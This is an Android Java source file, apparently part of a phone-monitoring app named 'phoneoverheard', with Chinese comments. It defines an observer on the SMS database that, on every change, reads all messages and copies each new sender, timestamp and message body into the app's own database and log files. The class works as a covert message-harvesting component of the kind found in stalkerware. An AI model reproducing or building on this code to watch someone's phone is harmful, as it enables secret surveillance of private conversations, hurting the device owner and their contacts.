package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.phoneoverheard.database.Smsmsg;
import com.phoneoverheard.database.SmsmsgService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SMSObserver extends ContentObserver {
	private static final String TAG = "SMSObserver";
	private Context mContext;
	@SuppressWarnings("unused")
	private Handler mHandler ;   //更新UI线程   
	WriteLog mylog = new WriteLog();
	
	public SMSObserver(Context context,Handler handler) {
		// TODO Auto-generated constructor stub
		super(handler);
		mContext = context ;  
        mHandler = handler ; 
	}
	@Override
    @SuppressLint("SimpleDateFormat")
    public void onChange(boolean selfChange) {
        Log.i(TAG, "短信数据库记录发生变化");
        mylog.WrLog("i",TAG,"短信数据库记录发生变化");
        //查询发件箱里的内容       
        String receiveTime = "";
        Uri outSMSUri = Uri.parse("content://sms/") ;  
        Cursor c = mContext.getContentResolver().query(outSMSUri, null, null, null,"date desc");
        if(c != null){ 
        	//循环遍历  
        	int i=0;
        	while (c.moveToNext()) {
                String read = c.getString(c.getColumnIndex("read"));
                String typeColumn = c.getString(c.getColumnIndex("type"));
                String dateColumn = c.getString(c.getColumnIndex("date"));
                if(dateColumn!=null && dateColumn!=""){
    				Date datetime = new Date(Long.valueOf(dateColumn));
    				SimpleDateFormat Dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    				receiveTime = Dateformat.format(datetime);
                }   
                String phoneNumberColumn = c.getString(c.getColumnIndex("address"));
                String smsbodyColumn = c.getString(c.getColumnIndex("body"));
                SmsmsgService smsmsgservice = new SmsmsgService(mContext);
                Smsmsg smsmsg = new Smsmsg(Integer.parseInt(read),Integer.parseInt(typeColumn),dateColumn,phoneNumberColumn,smsbodyColumn);                
                if(!smsmsgservice.SmsmsgExist(dateColumn,phoneNumberColumn)){
                	smsmsgservice.insert(smsmsg);                	
                	Log.i(TAG, read + " " + typeColumn + " " + receiveTime + " " + phoneNumberColumn + " " + smsbodyColumn + "\n") ;
                	mylog.WrLog("i",TAG,read + " " + typeColumn + " " + receiveTime + " " + phoneNumberColumn + " " + smsbodyColumn + "\n");
                	i++;
                }
            }  
        	Log.i(TAG, "写入短信记录表："+i+"条\n") ;
        	mylog.WrLog("i",TAG,"写入短信记录表："+i+"条\n");
    		c.close(); 
    		c = null;
        }
    }
    
}
